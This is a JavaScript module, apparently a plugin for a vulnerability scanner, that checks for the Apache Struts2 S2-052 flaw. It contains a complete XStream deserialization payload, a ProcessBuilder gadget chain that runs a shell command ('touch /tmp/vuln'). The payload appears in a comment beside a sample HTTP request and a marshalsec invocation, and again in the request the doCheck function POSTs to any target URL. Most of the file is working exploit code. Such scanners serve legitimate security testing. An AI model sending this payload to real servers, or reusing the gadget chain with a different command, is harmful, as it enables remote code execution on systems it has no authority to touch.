
module.exports={
	tags:"struts2,052",
	des:"struts2 052Vulnerability detection",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-052",
		""],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-052"],
	/*
java -cp jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc


POST /orders;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/xml
Content-Length: 1659
Referer: http://127.0.0.1:8080/orders/3/edit
Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
Connection: close
Upgrade-Insecure-Requests: 1


<map> 
<entry> 
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>/usr/bin/touch</string><string>/tmp/vuln</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
</entry> 
</map>
	*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self, szData = _s.fnMyHelp(function(){
/*
<map> 
<entry> 
<jdk.nashorn.internal.objects.NativeString>
  <flags>0</flags>
  <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
    <dataHandler>
      <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
         <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
               <initialized>false</initialized>
               <opmode>0</opmode>
               <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                        <command>
                             <string>/usr/bin/touch</string>
                             <string>/tmp/vuln</string>
                        </command>
                        <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                      <method>
                         <class>java.lang.ProcessBuilder</class>
                         <name>start</name>
                         <parameter-types/>
                      </method>
                      <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
            <done>false</done>
            <ostart>0</ostart>
            <ofinish>0</ofinish>
            <closed>false</closed>
         </is>
         <consumed>false</consumed>
      </dataSource>
      <transferFlavors/>
    </dataHandler>
    <dataLen>0</dataLen>
  </value>
</jdk.nashorn.internal.objects.NativeString>
<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
</entry>
<entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
</entry> 
</map>
*/}).trim();
		var szOldUrl = url,fnTT = function(x1)
		{
			return _s.fnUrlEncode(x1,'#:@=.[]?( )');
		};
		_s.request(_s.fnOptHeader({method: 'POST',uri: url,
			data:szData,
			headers:{
				"content-type": "application/xml",
				"user-agent": _s.g_szUa,
				"upgrade-insecure-requests": 1
			}
		}),
	    	function(e,r,b)
	    {
        _s.error(e);
        _s.fnShowBody(b);
	    	// console.log(b);
	    	_s.fnDoBody(b,"s2-052",szOldUrl,null,function(o)
	    	{
	    		var r = {"url":szOldUrl,"send":url};
  				fnCbk(_s.copyO2O(r,o),_t);
	    	});
	    });
	}
};